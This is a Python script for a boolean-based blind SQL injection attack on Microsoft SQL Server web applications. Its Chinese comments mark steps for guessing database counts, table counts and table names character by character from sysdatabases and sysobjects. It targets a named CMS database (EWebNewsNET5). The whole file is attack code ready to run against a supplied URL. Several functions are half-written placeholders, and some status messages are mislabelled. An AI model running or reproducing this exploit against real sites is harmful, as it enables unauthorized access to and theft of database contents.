#!/usr/bin/python3

import requests
import sys

def convert_ascii_to_char(encoded_list):
    decoded_str = "";
    for i in encoded_list:
        decoded_str += chr(i);
    return decoded_str;

def http_request(new_url):
    r = requests.get(new_url);
    return r.status_code,len(r.text);

#猜解数据库个数
def guess_db_count(url):
    #猜解数据库个数
    db_payload_0 = "' and (select count(*) from master.dbo.sysdatabases)=7 and 'a'='a";
    for i in range(1, 51):
        payload = "xxx" + str(i) + "";
        new_url = url + payload;
        return_array = http_request(new_url);
        if return_array[0] == 500:
            print("return status code is 200, means internal server error");
            exit();
        elif return_array[0] == 404:
            print("return status code is 404, means not found");
            exit();
        elif return_array[0] == 403:
            print("return status code is 403, means forbidden");
            exit();
        elif return_array[0] == 200:
            print( "the length of the return text is: " + str(return_array[1]) + " , and the payload is: " + str(i) );
        else:
            print("return status code is unknown");
            exit();
        
        #猜解指定数据库的字符数
        db_payload_1 = "' and (select COUNT(*) from master.dbo.sysdatabases where dbid=1 and LEN(name)=6)=1 and 'a'='a";

        #猜解指定数据库的每个字符
        db_payload_2 = "' and ascii(substring((select name from master.dbo.sysdatabases where dbid=1),1,1))=1 and 'a'='a";

#猜解数据库名长度
#def guess_db_name_length(url):
    
#猜解数据库名
#def guess_db_name(url):

#猜解表个数
def guess_table_count(url):
    #payload = "' and (select COUNT(*) from EWebNewsNET5.dbo.sysobjects where xtype='u')=1 and 'a'='a";
    for i in range(1, 51):
        payload = "' and (select COUNT(*) from EWebNewsNET5.dbo.sysobjects where xtype='u')=" + str(i) + "and 'a'='a";
        new_url = url + payload;
        return_array = http_request(new_url);
        if return_array[0] == 500:
            print("return status code is 200, means internal server error");
            exit();
        elif return_array[0] == 404:
            print("return status code is 404, means not found");
            exit();
        elif return_array[0] == 403:
            print("return status code is 403, means forbidden");
            exit();
        elif return_array[0] == 200:
            print( "Attempt " + str(i) + ": the length of the return text is: " + str(return_array[1]) + " and the payload is: " + str(i) );
        else:
            print("return status code is unknown");
            exit();

#猜解表名长度
def guess_table_name_length(url):
    #payload = "' and len((select top 1 name from EWebNewsNET5.dbo.sysobjects where xtype='u'))=9 and 'a'='a";
    #for i in range(1, 22):
    for j in range(1, 51):
        payload = "' and len((select top 1 name from EWebNewsNET5.dbo.sysobjects where xtype='u'))=" + str(j) + "and 'a'='a";
        new_url = url + payload;
        return_array = http_request(new_url);
        if return_array[0] == 500:
            print("return status code is 200, means internal server error");
            exit();
        elif return_array[0] == 404:
            print("return status code is 404, means not found");
            exit();
        elif return_array[0] == 403:
            print("return status code is 403, means forbidden");
            exit();
        elif return_array[0] == 200:
            print( "Attempt " + str(j) + ": the length of the return text is: " + str(return_array[1]) + " and the payload is: " + str(j) );
        else:
            print("return status code is unknown");
            exit();

#猜解表名
def guess_table_name(url, db_name):
    #payload = "' and ascii(substring((select top 1 name from EWebNewsNET5.dbo.sysobjects where xtype='u'),1,1))=1 and 'a'='a";
    #payload = "";
    table_name = "";
    for i in range(1, 7):
        with open("char-ascii.txt", "r") as f:
            lines = f.readlines();
            for line in lines:
                j = line.strip("\n");
                payload = "' and ascii(substring((select top 1 name from " + db_name + ".dbo.sysobjects where xtype='u')," + str(i) + ",1))='" + j + "' and 'a'='a";
                new_url = url + payload;
                return_array = http_request(new_url);
                if return_array[0] == 500:
                    print("return status code is 500, means internal server error");
                    exit();
                elif return_array[0] == 404:
                    print("return status code is 404, means not found");
                    exit();
                elif return_array[0] == 403:
                    print("return status code is 403, means forbidden");
                    exit();
                elif return_array[0] == 200:
                    print("Attempting character " + str(i) + " payload " + j);
                    if return_array[1] != 15:
                        table_name += chr( int(j) );
                        print("                 Yes, the character " + chr( int(j) ) + " is where you need");
                        break;
                else:
                    print("return status code is unknown");
                    exit();
    print("Congratulation, The final table name is: " + table_name);

#猜解字段数
def guess_column_count(url):
    #猜解指定表的字段数
    column_payload = "";
    for i in range(1, 51):
        payload = "xxx" + str(i) + "";
        new_url = url + payload;
        return_array = http_request(new_url);
        if return_array[0] == 500:
            print("return status code is 200, means internal server error");
            exit();
        elif return_array[0] == 404:
            print("return status code is 404, means not found");
            exit();
        elif return_array[0] == 403:
            print("return status code is 403, means forbidden");
            exit();
        elif return_array[0] == 200:
            print( "the length of the return text is: " + str(return_array[1]) + " , and the payload is: " + str(i) );
        else:
            print("return status code is unknown");
            exit();

#猜解字段名长度
#def guess_column_name_length(url):

#猜解字段名
#def guess_column_name(url):

#猜解字段值个数
def guess_value_count(url):
    #猜解指定数据库的指定表的指定字段的值个数
    value_payload = "";
    for i in range(1, 51):
        payload = "xxx" + str(i) + "";
        new_url = url + payload;
        return_array = http_request(new_url);
        if return_array[0] == 500:
            print("return status code is 200, means internal server error");
            exit();
        elif return_array[0] == 404:
            print("return status code is 404, means not found");
            exit();
        elif return_array[0] == 403:
            print("return status code is 403, means forbidden");
            exit();
        elif return_array[0] == 200:
            print( "the length of the return text is: " + str(return_array[1]) + " , and the payload is: " + str(i) );
        else:
            print("return status code is unknown");
            exit();

#猜解字段值长度
#def guess_value_name_length(url):

#猜解字段值
#def guess_value_name(url):

def main():
    if len(sys.argv) != 2:
        print("Usage: below example is from linux");
        print("Usage: python3 sqlserver-boolean-blind-exp.py http://www.example.com/index.php?id=5");
        exit();
    else:
        url = sys.argv[1];
    
    db_names = ["EWebNewsNET5", "rykp"];
    db_name = db_names[0];
    guess_table_name(url, db_name);

main();
